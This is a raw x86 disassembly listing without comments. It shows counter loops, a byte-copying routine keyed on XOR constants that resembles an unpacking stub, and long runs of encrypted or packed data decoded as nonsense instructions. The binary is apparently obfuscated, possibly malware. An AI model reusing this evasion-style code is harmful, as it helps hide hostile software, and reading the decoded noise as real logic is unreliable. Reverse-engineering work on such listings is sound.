  40f408:	cmp    DWORD PTR ds:0x433657,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x433657
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x433657,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x4336ef,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x4336ef
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x4336ef,ecx
  40f444:	cmp    DWORD PTR ds:0x4336ef,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x4336ef,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x4336ef
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x4336ef,ecx
  40f474:	cmp    DWORD PTR ds:0x4336ef,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x4336db,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x4336db
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x4336db,edx
  40f498:	cmp    DWORD PTR ds:0x4336db,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433891
  40f4af:	push   0x4338e7
  40f4b4:	push   0x4338cb
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x4336db,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433717
  40f4d2:	adc    DWORD PTR ds:0x433727,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax-0x6036a0c7]
  40f540:	cmp    dl,ah
  40f542:	lods   al,BYTE PTR ds:[esi]
  40f543:	jle    0x40f5c3
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	les    esi,FWORD PTR [esi-0x1d555bf5]
  40f54f:	pop    ecx
  40f550:	push   es
  40f551:	jmp    0x40f4ec
  40f553:	in     al,0x14
  40f555:	imul   BYTE PTR [ebx+0x44]
  40f558:	or     al,0x8
  40f55a:	and    ebp,ebp
  40f55c:	ins    BYTE PTR es:[edi],dx
  40f55d:	(bad)  
  40f55e:	in     al,0x57
  40f560:	mov    ah,0xc8
  40f562:	scas   eax,DWORD PTR es:[edi]
  40f563:	adc    DWORD PTR [edi+0x5ddbfa11],0xffffff9b
  40f56a:	xchg   esi,eax
  40f56b:	add    DWORD PTR [ebp+0x20],0x2
  40f56f:	cli    
  40f570:	and    DWORD PTR [edx+0x38],0xffffffd0
  40f574:	mov    ss,WORD PTR [edi]
  40f576:	pop    ds
  40f577:	push   eax
  40f578:	dec    edi
  40f579:	gs std 
  40f57b:	push   cs
  40f57c:	or     ecx,DWORD PTR [ecx]
  40f57e:	(bad)  
  40f580:	mov    ds:0x4f9ac3e2,al
  40f585:	nop
  40f586:	push   ds
  40f587:	add    ebx,DWORD PTR fs:[edx+0x66]
  40f58b:	pop    eax
  40f58c:	or     al,0x1d
  40f58e:	je     0x40f5d6
  40f590:	jecxz  0x40f525
  40f592:	mov    es,WORD PTR [eax+0x5ae329a1]
  40f598:	in     al,0xe4
  40f59a:	push   ebx
  40f59b:	add    eax,0x34d3cf65
  40f5a0:	je     0x40f525
  40f5a2:	mov    cl,cl
  40f5a4:	(bad)  
  40f5a5:	rol    edx,cl
  40f5a7:	gs leave 
  40f5a9:	push   ebp
  40f5aa:	jle    0x40f5c1
  40f5ac:	outs   dx,DWORD PTR ds:[esi]
  40f5ad:	stos   DWORD PTR es:[edi],eax
  40f5ae:	fnsave [eax]
  40f5b0:	ins    DWORD PTR es:[edi],dx
  40f5b1:	push   cx
  40f5b3:	pop    ebp
  40f5b4:	scas   eax,DWORD PTR es:[edi]
  40f5b5:	adc    DWORD PTR [eax+0x26252e83],edi
  40f5bb:	dec    esi
  40f5bc:	mov    WORD PTR [edi],?
  40f5be:	cs xchg esp,eax
  40f5c0:	jmp    0x2e22:0x5db58312
  40f5c7:	es mov dl,0xc6
  40f5ca:	call   0xe071e3ea
  40f5cf:	mov    dl,0xfc
  40f5d1:	je     0x40f61f
  40f5d3:	and    edi,DWORD PTR ds:0x7579266
  40f5d9:	push   cs
  40f5da:	fistp  WORD PTR [eax]
  40f5dc:	cwde   
  40f5dd:	mov    DWORD PTR [ecx],esp
  40f5df:	test   al,0xb6
  40f5e1:	lods   al,BYTE PTR ds:[esi]
  40f5e2:	rol    BYTE PTR [edi+0x43],1
  40f5e5:	inc    eax
  40f5e6:	mov    bl,0xdc
  40f5e8:	les    ebx,FWORD PTR [ebx-0x4c]
  40f5eb:	shl    ch,cl
  40f5ed:	pop    ss
  40f5ee:	add    BYTE PTR [edi-0x3689c8b6],al
  40f5f4:	mov    DWORD PTR [eax],ebx
  40f5f6:	test   DWORD PTR [ebp+0x1331197f],0x6268fbdb
  40f600:	mov    eax,ds:0xc40fd804
  40f605:	rcr    DWORD PTR [edx+eax*2],0x3e
  40f609:	push   edx
  40f60a:	test   ah,dl
  40f60c:	outs   dx,DWORD PTR ds:[esi]
  40f60d:	mov    cl,al
  40f60f:	rol    DWORD PTR [ecx-0x43],0x6b
  40f613:	dec    esp
  40f614:	sbb    esp,edi
  40f616:	out    dx,al
  40f617:	(bad)  
  40f618:	out    0xda,al
  40f61a:	or     al,0x64
  40f61c:	ret    0x4ac9
  40f61f:	push   ecx
  40f620:	leave  
  40f621:	popa   
  40f622:	mov    eax,ds:0x9c057108
  40f627:	mov    ebp,DWORD PTR [eax-0x2bf45f46]
  40f62d:	jo     0x40f69d
  40f62f:	jb     0x40f5b7
  40f631:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f632:	dec    esi
  40f633:	in     al,dx
  40f634:	xchg   ecx,eax
  40f635:	jae    0x40f5ee
  40f637:	mov    eax,fs:0xe1f045ce
  40f63d:	sbb    ch,ah
  40f63f:	mov    ebp,0xea9a2f52
  40f644:	push   edi
  40f645:	jmp    0x37990efe
  40f64a:	jnp    0x40f67c
  40f64c:	sbb    ebx,DWORD PTR [ebp-0x2f]
  40f64f:	dec    edx
  40f650:	mov    bh,0xf2
  40f652:	es mov dl,0x3c
  40f655:	jb     0x40f5ef
  40f657:	fsubr  QWORD PTR [eax]
  40f659:	and    ecx,ecx
  40f65b:	mov    ch,al
  40f65d:	int3   
  40f65e:	neg    DWORD PTR [ebp+0x13]
  40f661:	cmp    al,0x8d
  40f663:	inc    esp
  40f664:	sub    BYTE PTR [esi-0x2653ad38],bh
  40f66a:	int    0xa1
  40f66c:	sbb    BYTE PTR [ecx+0x18],ah
  40f66f:	push   edi
  40f670:	aam    0xc5
  40f672:	in     al,0xf
  40f674:	mov    DWORD PTR [edx+0x6f73fe19],ebp
  40f67a:	inc    edx
  40f67b:	and    ebx,ebp
  40f67d:	mov    bl,0x68
  40f67f:	sub    DWORD PTR [ebx+edi*8],0xb76d1663
  40f686:	enter  0x33e2,0x49
  40f68a:	out    0xe6,eax
  40f68c:	push   edi
  40f68d:	dec    ecx
  40f68e:	mov    ds:0x23df5261,al
  40f693:	test   DWORD PTR [ebx-0x53d6fbd3],esi
  40f699:	xchg   DWORD PTR [edi-0x59],esp
  40f69c:	dec    edx
  40f69d:	mov    ah,0x26
  40f69f:	add    eax,0x6afcd019
  40f6a4:	push   0x52
  40f6a6:	test   DWORD PTR [ebp-0x477a27b4],eax
  40f6ac:	enter  0xe0c9,0x9e
  40f6b0:	xchg   edi,eax
  40f6b1:	jmp    0x40f64a
  40f6b3:	repnz add eax,0x6f299e
  40f6b9:	adc    eax,0xebb94c4a
  40f6be:	std    
  40f6bf:	or     eax,0xc9b0a97b
  40f6c4:	leave  
  40f6c5:	inc    edi
  40f6c6:	jae    0x40f732
  40f6c8:	jecxz  0x40f72f
  40f6ca:	pop    ecx
  40f6cb:	ds leave 
  40f6cd:	push   ebp
  40f6ce:	mov    ebx,0x7a01c534
  40f6d3:	addr16 mov al,0x3
  40f6d6:	mov    ch,0x66
  40f6d8:	and    BYTE PTR [esi-0x6c],dh
  40f6db:	ret    0x7366
  40f6de:	int3   
  40f6df:	lods   al,BYTE PTR ds:[esi]
  40f6e0:	jns    0x40f723
  40f6e2:	and    eax,0x9537fe31
  40f6e7:	push   0x682fe8ed
  40f6ec:	dec    esp
  40f6ed:	push   es
  40f6ee:	push   ebp
  40f6ef:	sub    eax,0x14da221e
  40f6f4:	repz push 0x6e
  40f6f7:	xchg   ebp,eax
  40f6f8:	sub    DWORD PTR [edi],0x2393f5ae
  40f6fe:	mov    eax,ds:0xb5c9d4a0
  40f703:	push   eax
  40f704:	push   edi
  40f705:	out    0x2,al
  40f707:	jmp    0x40f77f
  40f709:	and    eax,0x62
  40f70c:	out    dx,al
  40f70d:	les    eax,FWORD PTR [bx+di+0x416b]
  40f712:	mov    edi,0x86cec897
  40f717:	mov    ds:0xb05543cd,al
  40f71c:	mov    al,0x86
  40f71e:	inc    edi
  40f71f:	ret    0x7ef
  40f722:	mov    edx,0x54a4f34a
  40f727:	pop    ebp
  40f728:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f729:	adc    eax,0xd241d760
  40f72e:	and    BYTE PTR [ebp-0xed067e0],al
  40f734:	xchg   esp,eax
  40f735:	int    0x67
  40f737:	fsubr  QWORD PTR [esi]
  40f739:	pop    esi
  40f73a:	push   ss
  40f73b:	pop    ebp
  40f73c:	push   0xc7c20025
  40f741:	mov    WORD PTR [edi],cs
  40f743:	aaa    
  40f744:	jb     0x40f745
  40f746:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f747:	push   ss
  40f748:	jne    0x40f778
  40f74a:	ds mov bl,ah
  40f74d:	jmp    0x40f6ec
  40f74f:	lock fwait
  40f751:	xor    al,BYTE PTR [edi]
  40f753:	out    dx,eax
  40f754:	retf   
  40f755:	(bad)  ds:0xe61d9059
  40f75b:	scas   al,BYTE PTR es:[edi]
  40f75c:	inc    esi
  40f75d:	pop    ss
  40f75e:	mov    al,0xc0
  40f760:	inc    ebp
  40f761:	and    ebp,DWORD PTR [ebx+0x3f7dba81]
  40f767:	mov    ecx,0x177bf1e8
  40f76c:	cwde   
  40f76d:	mov    esp,0x51065bdb
  40f772:	call   0x74e8bdbb
  40f777:	fidivr WORD PTR [edx+0x681b2b9c]
  40f77d:	or     eax,0xe3555c32
  40f782:	(bad)  
  40f784:	add    DWORD PTR [edi],edi
  40f786:	jge    0x40f70a
  40f788:	stos   DWORD PTR es:[edi],eax
  40f789:	popa   
  40f78a:	in     al,0xd8
  40f78c:	pop    ds
  40f78d:	xchg   esp,eax
  40f78e:	sbb    DWORD PTR [ecx+0x26],esi
  40f791:	push   ecx
  40f792:	mov    WORD PTR [esi+0x79],fs
  40f795:	scas   al,BYTE PTR es:[edi]
  40f796:	inc    ebp
  40f797:	push   esi
  40f798:	push   ss
  40f799:	addr16 pop ss
  40f79b:	(bad)  
  40f79c:	sahf   
  40f79d:	xchg   ecx,eax
  40f79e:	xchg   BYTE PTR fs:[eax+0x16ba3309],bl
  40f7a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7a6:	enter  0xf656,0x46
  40f7aa:	add    al,BYTE PTR [ecx+edi*1-0x5b]
  40f7ae:	xchg   esp,eax
  40f7af:	ficomp WORD PTR [eax-0x1c]
  40f7b2:	jg     0x40f77d
  40f7b4:	mov    cl,bh
  40f7b6:	out    0x16,al
  40f7b8:	pushf  
  40f7b9:	and    eax,0xac965415
  40f7be:	jmp    0x3943:0xe08db0aa
  40f7c5:	jecxz  0x40f7d3
  40f7c7:	je     0x40f74a
  40f7c9:	xchg   edx,eax
  40f7ca:	cli    
  40f7cb:	pop    ds
  40f7cc:	adc    al,0x4a
  40f7ce:	push   esi
  40f7cf:	(bad)  
  40f7d0:	cmc    
  40f7d1:	cmc    
  40f7d2:	lds    ebx,FWORD PTR [esi]
  40f7d4:	xchg   DWORD PTR [ebp-0x68],ebp
  40f7d7:	sub    ah,bl
  40f7d9:	cmp    ebp,DWORD PTR [esi]
  40f7db:	dec    esi
  40f7dc:	xchg   ecx,eax
  40f7dd:	ja     0x40f846
  40f7df:	mov    ch,0xa9
  40f7e1:	mov    ebp,0x50f5a385
  40f7e6:	in     al,dx
  40f7e7:	cmp    bh,bh
  40f7e9:	(bad)  
  40f7ea:	scas   al,BYTE PTR es:[edi]
  40f7eb:	push   0x93c289e1
  40f7f0:	adc    ecx,ebx
  40f7f2:	cdq    
  40f7f3:	push   0x347f1c7b
  40f7f8:	jae    0x40f82c
  40f7fa:	mov    ecx,0x50b397a8
  40f7ff:	and    esi,ecx
  40f801:	or     BYTE PTR [edi-0x4e],0x27
  40f805:	mov    bh,0xd0
  40f807:	add    al,0x1
  40f809:	xlat   BYTE PTR ds:[ebx]
  40f80a:	cs jmp 0x40f7a5
  40f80d:	fcompp 
  40f80f:	dec    esi
  40f810:	mov    ecx,0xc29f93f8
  40f815:	pop    es
  40f816:	rol    al,1
  40f818:	sar    eax,0xb8
  40f81b:	out    dx,al
  40f81c:	je     0x40f860
  40f81e:	pop    eax
  40f81f:	mov    al,ds:0x1aac3a13
  40f824:	xor    ebx,DWORD PTR [edi]
  40f826:	aaa    
  40f827:	out    dx,al
  40f828:	cs jae 0x40f86c
  40f82b:	out    0xd4,eax
  40f82d:	push   ebp
  40f82e:	in     eax,dx
  40f82f:	ret    0xf96c
  40f832:	bound  esi,QWORD PTR gs:0x90573fbb
  40f839:	out    dx,eax
  40f83a:	mov    ss,WORD PTR [edx]
  40f83c:	mov    esi,0x72813b2e
  40f841:	pop    es
  40f842:	clc    
  40f843:	pop    ds
  40f844:	rol    BYTE PTR [eax],0x1a
  40f847:	xchg   ebx,eax
  40f848:	jge    0x40f8ba
  40f84a:	dec    esi
  40f84b:	xor    edi,ecx
  40f84d:	add    edi,esi
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0xbcf7563f
  40f897:	repnz shr BYTE PTR [ebx+0x7d7c7e7e],cl
  40f89e:	jle    0x40f91e
  40f8a0:	mov    ds:0x9b394e28,al
  40f8a5:	lds    ecx,FWORD PTR [edx]
  40f8a7:	jne    0x40f8e5
  40f8a9:	dec    ebp
  40f8aa:	inc    eax
  40f8ab:	and    BYTE PTR [eax-0x4d],0xd8
  40f8af:	adc    esp,DWORD PTR [esi+0xc6130df]
  40f8b5:	fisttp WORD PTR [edx-0x49]
  40f8b8:	inc    ebp
  40f8b9:	shr    BYTE PTR [edi],1
  40f8bb:	cmp    al,0x99
  40f8bd:	call   0x51342bdb
  40f8c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8c3:	and    DWORD PTR [edi],edx
  40f8c5:	imul   eax,DWORD PTR [ecx],0x78
  40f8c8:	and    DWORD PTR [edx+ebx*1+0xb4c4a6d],edx
  40f8cf:	ret    0x1f39
  40f8d2:	or     al,0x48
  40f8d4:	inc    edx
  40f8d5:	jge    0x40f88e
  40f8d7:	push   0xc2cd6fa7
  40f8dc:	jns    0x40f8a0
  40f8de:	xor    al,0x4a
  40f8e0:	and    eax,0x36bdac71
  40f8e5:	or     al,0xd5
  40f8e7:	mov    ah,0x2e
  40f8e9:	hlt    
  40f8ea:	loope  0x40f935
  40f8ec:	aam    0xd
  40f8ee:	jmp    DWORD PTR [eax+0x186976c9]
  40f8f4:	shl    DWORD PTR [ebp+0x2209ce7a],cl
  40f8fa:	lock iret 
  40f8fc:	jbe    0x40f8dd
  40f8fe:	adc    ch,BYTE PTR [esi+0x57e0c75d]
  40f904:	pusha  
  40f905:	jg     0x40f8c4
  40f907:	mov    DWORD PTR [edi],edx
  40f909:	adc    al,0x98
  40f90b:	out    0x3c,al
  40f90d:	mov    dl,0x56
  40f90f:	jnp    0x40f960
  40f911:	jae    0x1fabe0ed
  40f917:	out    0xd3,eax
  40f919:	inc    ecx
  40f91a:	rcl    BYTE PTR [esi-0x1538ce44],0x78
  40f921:	faddp  st(7),st
  40f923:	mov    esi,0x42b80c6d
  40f928:	cmc    
  40f929:	inc    ecx
  40f92a:	inc    edi
  40f92b:	push   ss
  40f92c:	jg     0x40f96c
  40f92e:	xchg   esi,eax
  40f92f:	sub    DWORD PTR [ebp+0x4e],esi
  40f932:	xchg   DWORD PTR [eax-0x1922b60d],ecx
  40f938:	ja     0x40f8f6
  40f93a:	das    
  40f93b:	xor    eax,0x16d6c6f5
  40f940:	sub    DWORD PTR [ecx-0x2a4c4acb],edi
  40f946:	fs xchg esi,eax
  40f948:	mov    ?,WORD PTR [edx]
  40f94a:	jle    0x40f995
  40f94c:	lds    ebp,FWORD PTR [ecx]
  40f94e:	rcl    BYTE PTR [eax],0xe9
  40f951:	add    DWORD PTR [edx+0x78],edi
  40f954:	nop
  40f955:	mov    ch,0xe7
  40f957:	cmp    eax,edx
  40f959:	retf   0x800f
  40f95c:	pop    es
  40f95d:	cs retf 
  40f95f:	push   edx
  40f960:	out    dx,al
  40f961:	hlt    
  40f962:	sub    al,0x25
  40f964:	mov    bh,0x2f
  40f966:	jne    0x40f983
  40f968:	jns    0x40f8f4
  40f96a:	(bad)  
  40f96b:	adc    BYTE PTR [ecx+0xbb5d614],ah
  40f971:	cmp    DWORD PTR [ecx+0x2f],esi
  40f974:	popf   
  40f975:	dec    ebp
  40f976:	add    al,0xee
  40f978:	cli    
  40f979:	int3   
  40f97a:	call   0x5c62:0x50eb2d9c
  40f981:	loop   0x40f906
  40f983:	add    ah,BYTE PTR [ebp+0x4f114d33]
  40f989:	mov    edx,0xa5e14cfd
  40f98e:	shl    DWORD PTR [ebx+0x63],1
  40f991:	popa   
  40f992:	pop    sp
  40f994:	xor    esp,DWORD PTR [edx]
  40f996:	imul   ecx,DWORD PTR [ebp+0x2be0e74a],0x50be8f66
  40f9a0:	fisttp DWORD PTR [ebp+eax*1+0x50]
  40f9a4:	enter  0x577e,0x2a
  40f9a8:	sti    
  40f9a9:	clc    
  40f9aa:	ja     0x40f9fe
  40f9ac:	lahf   
  40f9ad:	cld    
  40f9ae:	stos   BYTE PTR es:[edi],al
  40f9af:	pop    ecx
  40f9b0:	or     eax,edx
  40f9b2:	mov    esp,es
  40f9b4:	cs dec edi
  40f9b6:	or     DWORD PTR [ebp-0x3d],0x10364f38
  40f9bd:	dec    ebx
  40f9be:	inc    eax
  40f9bf:	je     0x40fa01
  40f9c1:	push   eax
  40f9c2:	lds    ebx,FWORD PTR [ebx+eiz*8-0x39713623]
  40f9c9:	jns    0x40f956
  40f9cb:	test   al,0x6f
  40f9cd:	xchg   DWORD PTR [esp+ebp*4],eax
  40f9d0:	push   0x49
  40f9d2:	adc    eax,0x357492a7
  40f9d7:	fcom   QWORD PTR [ebx]
  40f9d9:	ficomp DWORD PTR [ecx-0x21]
  40f9dc:	add    al,cl
  40f9de:	in     eax,0xb5
  40f9e0:	enter  0xcb9c,0xb1
  40f9e4:	loopne 0x40f9c0
  40f9e6:	dec    edi
  40f9e7:	xchg   DWORD PTR [ecx+0x2b],esp
  40f9ea:	js     0x40f9ef
  40f9ec:	mov    ebx,0x388d25cd
  40f9f1:	cmp    dl,ch
  40f9f3:	call   0x3cb30009
  40f9f8:	pop    ebp
  40f9f9:	loop   0x40f986
  40f9fb:	jmp    0x40f9c9
  40f9fd:	adc    al,0xc1
  40f9ff:	rol    DWORD PTR [edx],1
  40fa01:	sbb    al,0x6f
  40fa03:	sub    eax,0xce968c8d
  40fa08:	retf   
  40fa09:	xlat   BYTE PTR ds:[ebx]
  40fa0a:	xchg   esi,eax
  40fa0b:	mov    fs,WORD PTR [eax]
  40fa0d:	and    al,cl
  40fa0f:	mov    al,ds:0x83314841
  40fa14:	nop
  40fa15:	pop    ecx
  40fa16:	mov    eax,edi
  40fa18:	xchg   edx,eax
  40fa19:	data16 mov bl,0xd4
  40fa1c:	test   BYTE PTR [ebx+0x1781a33e],cl
  40fa22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa23:	sub    BYTE PTR [eax-0x6f],0x40
  40fa27:	mov    BYTE PTR [esi-0x43],al
  40fa2a:	out    0xdf,al
  40fa2c:	data16 jo 0x40f9b7
  40fa2f:	pusha  
  40fa30:	out    0xac,al
  40fa32:	pop    ebx
  40fa33:	lods   eax,DWORD PTR ds:[esi]
  40fa34:	int3   
  40fa35:	mov    edx,0x967f62b6
  40fa3a:	mov    DWORD PTR [eax+0x41],edx
  40fa3d:	mov    edi,0x55c3385e
  40fa42:	icebp  
  40fa43:	jae    0x40fa91
  40fa45:	push   0xffffff84
  40fa47:	div    ecx
  40fa49:	lea    ebp,[ebx]
  40fa4b:	test   BYTE PTR [ebp+0x16],ah
  40fa4e:	inc    ebp
  40fa4f:	and    bh,bh
  40fa51:	cdq    
  40fa52:	xchg   esp,eax
  40fa53:	js     0x40fa06
  40fa55:	mov    bh,0x4f
  40fa57:	inc    eax
  40fa58:	je     0x40fa55
  40fa5a:	xor    al,0xa3
  40fa5c:	pop    DWORD PTR ds:0x4f794628
  40fa62:	out    dx,eax
  40fa63:	mov    esp,0x8d332ac
  40fa68:	or     BYTE PTR [esi+ebp*8-0x3b],0xe2
  40fa6d:	and    eax,0x60545267
  40fa72:	fs add edi,edi
  40fa75:	or     al,0x55
  40fa77:	std    
  40fa78:	xor    BYTE PTR [edx+0xe],al
  40fa7b:	loop   0x40fa44
  40fa7d:	pop    DWORD PTR [ebx+0x57]
  40fa80:	jb     0x40faf5
  40fa82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa83:	in     eax,dx
  40fa84:	push   ebp
  40fa85:	in     eax,0x53
  40fa87:	adc    DWORD PTR [ebx],ebp
  40fa89:	pop    ds
  40fa8a:	fadd   QWORD PTR [esi+edx*4]
  40fa8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa8e:	lock fs push 0xe7cf0af1
  40fa95:	icebp  
  40fa96:	dec    ebx
  40fa97:	arpl   WORD PTR [eax],si
  40fa99:	sub    al,0x2b
  40fa9b:	push   ecx
  40fa9c:	jl     0x40faee
  40fa9e:	daa    
  40fa9f:	outs   dx,BYTE PTR ds:[esi]
  40faa0:	popa   
  40faa1:	sti    
  40faa2:	repz loop 0x40fa5b
  40faa5:	dec    edi
  40faa6:	adc    al,0x27
  40faa8:	test   eax,0xfea031f4
  40faad:	push   0x1fa8344e
  40fab2:	push   ss
  40fab3:	dec    ebx
  40fab4:	mov    esp,edi
  40fab6:	iret   
  40fab7:	shl    DWORD PTR [ecx+0x4c3918b6],0x10
  40fabe:	cs out dx,eax
  40fac0:	mov    bh,0x53
  40fac2:	xchg   edi,eax
  40fac3:	push   esi
  40fac4:	ins    DWORD PTR es:[edi],dx
  40fac5:	xchg   ecx,eax
  40fac6:	mov    dh,0x71
  40fac8:	data16 loopne 0x40fac9
  40facb:	dec    eax
  40facc:	(bad)  
  40facd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40face:	mov    edx,0x1c7973e2
  40fad3:	les    esp,FWORD PTR [eax]
  40fad5:	leavew 
  40fad7:	inc    ecx
  40fad8:	mov    ds:0xc10fd7ed,eax
  40fadd:	cmp    dl,ah
  40fadf:	loope  0x40fb1e
  40fae1:	stc    
  40fae2:	ja     0x40fac2
  40fae4:	or     esi,DWORD PTR [ecx-0x14]
  40fae7:	xchg   BYTE PTR [ecx-0x18],bh
  40faea:	sub    DWORD PTR [eax-0x72],ebx
  40faed:	ret    
  40faee:	inc    eax
  40faef:	inc    DWORD PTR [esi+0x2de78b42]
  40faf5:	jno    0x40fb4c
  40faf7:	adc    eax,0xae29db74
  40fafc:	aam    0x2
  40fafe:	arpl   WORD PTR [edi+ecx*1+0x38],dx
  40fb02:	sar    BYTE PTR [ebx-0x5a],1
  40fb05:	mov    esp,0x6fa815bd
  40fb0a:	(bad)  
  40fb0b:	push   esi
  40fb0c:	add    DWORD PTR [ecx+esi*1+0x12],esi
  40fb10:	icebp  
  40fb11:	dec    ecx
  40fb12:	or     DWORD PTR [edx-0x7a],esi
  40fb15:	lds    eax,FWORD PTR [edx]
  40fb17:	int3   
  40fb18:	je     0x40fb7c
  40fb1a:	hlt    
  40fb1b:	loopne 0x40fb21
  40fb1d:	cmp    dl,cl
  40fb1f:	inc    ecx
  40fb20:	pop    ebx
  40fb21:	add    esi,DWORD PTR [eax+eiz*8-0x4a]
  40fb25:	dec    esp
  40fb26:	mov    eax,0xb030c653
  40fb2b:	arpl   WORD PTR [ecx-0x54b7130d],bp
  40fb31:	sub    esp,DWORD PTR [ebp-0x1f]
  40fb34:	aam    0xba
  40fb36:	adc    eax,0xf7f98c63
  40fb3b:	push   ss
  40fb3c:	xchg   edx,eax
  40fb3d:	xor    bl,BYTE PTR [ecx+0x345caec1]
  40fb43:	loop   0x40fb95
  40fb45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb46:	clc    
  40fb47:	hlt    
  40fb48:	sub    eax,0x997f95e4
  40fb4d:	push   esi
  40fb4e:	iret   
  40fb4f:	jg     0x40fbc9
  40fb51:	(bad)  
  40fb52:	mov    ecx,0x766f5ac4
  40fb57:	inc    ebx
  40fb58:	inc    eax
  40fb59:	xchg   ebp,esi
  40fb5b:	hlt    
  40fb5c:	add    bh,cl
  40fb5e:	lea    ebx,ds:0x9ea3d45a
  40fb64:	imul   esp,esp,0xb13d9ac1
  40fb6a:	test   BYTE PTR [edi+ebx*2],ch
  40fb6d:	mov    eax,0x6aa41d08
  40fb72:	sbb    bh,cl
  40fb74:	mov    esi,0x4209c71c
  40fb79:	and    eax,esp
  40fb7b:	push   0xf6347c08
  40fb80:	and    DWORD PTR ds:0xf04bc919,edi
  40fb86:	inc    esp
  40fb87:	and    al,BYTE PTR [ecx-0x17]
  40fb8a:	retf   0x7264
  40fb8d:	lock out dx,eax
  40fb8f:	(bad)  
  40fb91:	mov    ah,0x3e
  40fb93:	jmp    0x75ecc32b
  40fb98:	pop    edx
  40fb99:	pop    ss
  40fb9a:	xlat   BYTE PTR ds:[ebx]
  40fb9b:	into   
  40fb9c:	mul    esi
  40fb9e:	push   cs
  40fb9f:	call   0xf979:0x860f57df
  40fba6:	(bad)  
  40fba7:	call   FWORD PTR [ebx-0x48]
  40fbaa:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0xffffffc6
  40fbc9:	pop    ebp
  40fbca:	adc    esp,esp
  40fbcc:	shl    BYTE PTR [esi+0x7d7c7e7e],1
  40fbd2:	jle    0x40fc52
  40fbd4:	aad    0xe0
  40fbd6:	bound  eax,QWORD PTR [edi]
  40fbd8:	pop    esp
  40fbd9:	jo     0x40fbee
  40fbdb:	pop    ss
  40fbdc:	bound  ebp,QWORD PTR [ebp+eiz*2-0x8]
  40fbe0:	inc    ecx
  40fbe1:	repz push DWORD PTR [ecx-0x5987c74d]
  40fbe8:	mov    ds:0x4de43950,eax
  40fbed:	adc    BYTE PTR [ecx],0x1e
  40fbf0:	push   cs
  40fbf1:	shl    BYTE PTR [ecx+0xa],1
  40fbf4:	js     0x40fc69
  40fbf6:	xchg   edx,eax
  40fbf7:	and    al,BYTE PTR [ecx+0x45]
